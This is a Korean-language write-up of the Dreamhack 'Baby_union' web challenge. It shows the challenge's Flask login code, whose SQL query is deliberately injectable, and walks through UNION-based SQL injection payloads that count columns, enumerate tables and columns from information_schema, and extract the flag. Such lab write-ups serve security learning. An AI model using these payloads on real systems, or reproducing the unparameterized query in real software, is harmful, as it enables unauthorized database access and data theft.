# ❤Baby_union❤
![js](https://img.shields.io/badge/MySQL-00000F?style=for-the-badge&logo=mysql&logoColor=white) ![js](https://img.shields.io/badge/Visual_Studio_Code-0078D4?style=for-the-badge&logo=visual%20studio%20code&logoColor=white)

## 개요
 - dreamhack web카테고리에서 간단한 union sqli 공격기법에 관한 문제를 풀이한 것입니다.

## Preview
![image](https://github.com/ChCh0i/dreamhack/assets/108965611/264bb018-d30e-4a0f-a599-626d6159c2f6)

 - 문제페이지 접속시 query문과 로그인 폼이 있는것을 확인할수 있습니다.

## Source
 - app.py
```
import os
from flask import Flask, request, render_template
from flask_mysqldb import MySQL

app = Flask(__name__)
app.config['MYSQL_HOST'] = os.environ.get('MYSQL_HOST', 'localhost')
app.config['MYSQL_USER'] = os.environ.get('MYSQL_USER', 'user')
app.config['MYSQL_PASSWORD'] = os.environ.get('MYSQL_PASSWORD', 'pass')
app.config['MYSQL_DB'] = os.environ.get('MYSQL_DB', 'secret_db')
mysql = MySQL(app)

@app.route("/", methods = ["GET", "POST"])
def index():

    if request.method == "POST":
        uid = request.form.get('uid', '')
        upw = request.form.get('upw', '')
        if uid and upw:
            cur = mysql.connection.cursor()
            cur.execute(f"SELECT * FROM users WHERE uid='{uid}' and upw='{upw}';")
            data = cur.fetchall()
            if data:
                return render_template("user.html", data=data)

            else: return render_template("index.html", data="Wrong!")

        return render_template("index.html", data="Fill the input box", pre=1)
    return render_template("index.html")


if __name__ == '__main__':
    app.run(host='0.0.0.0')
```
 - init.sql
```
CREATE DATABASE secret_db;
GRANT ALL PRIVILEGES ON secret_db.* TO 'dbuser'@'localhost' IDENTIFIED BY 'dbpass';

USE `secret_db`;
CREATE TABLE users (
  idx int auto_increment primary key,
  uid varchar(128) not null,
  upw varchar(128) not null,
  descr varchar(128) not null
);

INSERT INTO users (uid, upw, descr) values ('admin', 'apple', 'For admin');
INSERT INTO users (uid, upw, descr) values ('guest', 'melon', 'For guest');
INSERT INTO users (uid, upw, descr) values ('banana', 'test', 'For banana');
FLUSH PRIVILEGES;

CREATE TABLE fake_table_name (
  idx int auto_increment primary key,
  fake_col1 varchar(128) not null,
  fake_col2 varchar(128) not null,
  fake_col3 varchar(128) not null,
  fake_col4 varchar(128) not null
);

INSERT INTO fake_table_name (fake_col1, fake_col2, fake_col3, fake_col4) values ('flag is ', 'DH{sam','ple','flag}');
```

## 취약점
 - app.py를 확인하였을때 query문에 대한 검증을 실시하지않고 bind함수 미사용
 - init.sql을 확인하였을때 flag의 값은 어떠한 테이블의 컬럼내용을 참조하는것을 유추할수 있음
 - union sqli를 활용하여 컬럼을 조회

## payload
 - 'union select all 1,2,3,4....... -- - 숫자를 늘려가며 컬럼명을 유추 ('union select all 1,2,3,4 -- -)
![image](https://github.com/ChCh0i/dreamhack/assets/108965611/6b5765ec-08a2-4aab-9caf-b863afd82168)

 - 데이터베이스 명은 알아도 별 쓸모없으므로 패스하고 table명과 column명을 을 유추
```
'union select all Null,1,1,table_name from information_schema.tables -- -
```
![image](https://github.com/ChCh0i/dreamhack/assets/108965611/dde8c8a5-7d97-442c-b153-0a986da4703b)


 - 테이블명을 조회했을대 onlyflag란 테이블명이 존재 딱봐도 수상하니까 바로 컬럼을 조회
```
'union select all Null,1,1,column_name from information_schema.columns where table_name = 'onlyflag' -- -
```
![image](https://github.com/ChCh0i/dreamhack/assets/108965611/4e0369e0-53a4-4ef8-8718-525052f57820)

 - 컬럼명을 조회했을때 5개의 컬럼이 조회되는것을 확인할수있고 idx는 안봐도 auto_increment 인것을 알수있을것같다.
 - source code init.sql을 보았을때 flag의 값은 어떤 테이블의 컬럼들을 참조하는것을 알수있는데
 - sname는 조회해보았을때 "flag is" 라는 string이었으므로 다른 컬럼들을 순서대로 조회
```
'union select all svalue,sflag,1,sclose from onlyflag -- -
```
![image](https://github.com/ChCh0i/dreamhack/assets/108965611/d53097ed-87bc-4b8a-b7f9-1424de1c75eb)

